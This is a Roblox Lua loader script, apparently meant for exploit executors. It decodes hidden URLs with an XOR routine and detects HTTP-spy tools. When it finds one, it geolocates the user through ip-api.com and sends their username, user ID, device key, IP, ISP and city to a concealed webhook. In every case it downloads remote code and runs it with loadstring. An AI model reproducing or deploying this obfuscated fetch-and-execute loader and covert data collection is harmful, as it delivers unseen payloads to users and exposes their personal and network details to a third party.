local function _0xDE(h, k)
    local s = ""
    for i = 1, #h, 2 do
        local b = tonumber(h:sub(i, i+1), 16)
        s = s .. string.char(bit32.bxor(b, k) - (i % 10))
    end
    return s
end

local _0xK = 0x55
local _AL = _0xDE("3D3E3F3C309E8E8FFEC4D3CECDD9D087CDD8D18C9D8681889D8FD590929F99989B94D1D4D7D2D6DDDED6D9DDCAD8DED0D9D994D0DBDC97DCDEDADEDAD7C9D696DEDCDFD7C9D6C99596D3C9DCDEDADEDAD7C9D6CDDCDFD7C9DBDFCDDCD19BCCDADFCD", _0xK)
local _G1 = _0xDE("3D3E3F3C309E8E8FDFD085DED3DECD82DED2D6DECDC6D6D994DED8D6D9DDCAD8DE94D9CEC2DFD9D1D5CE97CFCFD1CEDAD7D6CF91DFD9D5CEDAD783DDC7DADF", _0xK)

local _req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
local _L = game:GetService("Players").LocalPlayer
local _H = game:GetService("HttpService")

local function _SC()
    if not _req then return false end
    local ok, info = pcall(debug.getinfo, _req)
    if ok and info and (info.source ~= "=[C]" or info.what ~= "C") then return "HOOKED_REQUEST" end
    if debug.getinfo(game.HttpGet).source ~= "=[C]" then return "HOOKED_HTTPGET" end
    local cg = game:GetService("CoreGui")
    for _, n in ipairs({"SimpleSpy", "HttpSpy", "HydroSpy", "VGG Spy", "TwiSpy", "NotDSF"}) do
        if cg:FindFirstChild(n) or getgenv()[n] then return "SPY_FOUND_" .. n end
    end
    return false
end

local _tk = "N/A"
pcall(function()
    if isfile and readfile and writefile then
        if isfile("nazarkus_key.json") then _tk = readfile("nazarkus_key.json")
        else _tk = _H:GenerateGUID(false) writefile("nazarkus_key.json", _tk) end
    end
end)

local _se = _SC()
if _se then
    local ni = {} pcall(function() local r = _req({Url = "http://ip-api.com/json/", Method = "GET"}) if r.Success then ni = _H:JSONDecode(r.Body) end end)
    pcall(function()
        _req({
            Url = _AL, Method = "POST", Headers = {["Content-Type"] = "application/json"},
            Body = _H:JSONEncode({
                embeds = {{
                    title = "Security Alert: Interceptor Detected",
                    color = 16711680,
                    fields = {
                        {name = "Detection", value = tostring(_se), inline = false},
                        {name = "Player", value = _L.Name .. " (" .. _L.UserId .. ")", inline = true},
                        {name = "Device Key", value = "```" .. _tk .. "```", inline = false},
                        {name = "Network", value = string.format("IP: %s\nISP: %s\nLoc: %s, %s", ni.query or "N/A", ni.isp or "N/A", ni.country or "N/A", ni.city or "N/A"), inline = false}
                    }
                }}
            })
        })
    end)
    _L:Kick("Security Tamper Detected. Session Blocked.")
    return
end

local _TS = game:GetService("TestService")
local _ST = _TS:FindFirstChild("__NK_RUNTIME") or Instance.new("Folder", _TS)
_ST.Name = "__NK_RUNTIME"
local _AU = Instance.new("StringValue", _ST)
_AU.Name = _L.Name
_AU.Value = "V8_SECURE_AUTH"
shared._NK_AUTH = "V8_SECURE_AUTH"

local ok, res = pcall(function() return game:HttpGet(_G1) end)
if ok and res then
    local f = loadstring(res)
    if f then task.spawn(f) end
else
    _L:Kick("Loader: Connection Error")
end
